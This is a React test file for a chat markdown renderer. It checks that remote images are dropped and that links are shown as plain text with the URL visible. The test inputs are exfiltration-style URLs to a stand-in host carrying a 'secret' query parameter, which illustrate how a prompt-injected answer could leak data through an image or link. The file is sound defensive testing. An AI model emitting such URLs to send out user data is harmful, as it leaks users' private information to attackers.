import React from 'react';
import {render} from '@testing-library/react';
import {CHAT_MARKDOWN_COMPONENTS} from './chatMarkdown';

const {img: Img, a: Link} = CHAT_MARKDOWN_COMPONENTS as Required<typeof CHAT_MARKDOWN_COMPONENTS>;

describe('chat markdown', () => {
    it('never loads a remote image, so a prompt-injected answer cannot send data out in its URL', () => {
        const {container} = render(<Img src="https://evil.example/x.png?d=secret" alt="chart"/>);

        expect(container.querySelector('img')).toBeNull();
        expect(container).toBeEmptyDOMElement();
    });

    it('shows links as plain text with the URL visible instead of a clickable anchor', () => {
        const {container} = render(<Link href="https://evil.example/?d=secret">our help page</Link>);

        expect(container.querySelector('a')).toBeNull();
        expect(container).toHaveTextContent('our help page (https://evil.example/?d=secret)');
    });

    it('does not repeat the URL when the link text is the URL', () => {
        const {container} = render(<Link href="https://example.com">https://example.com</Link>);

        expect(container).toHaveTextContent(/^https:\/\/example\.com$/);
    });
});
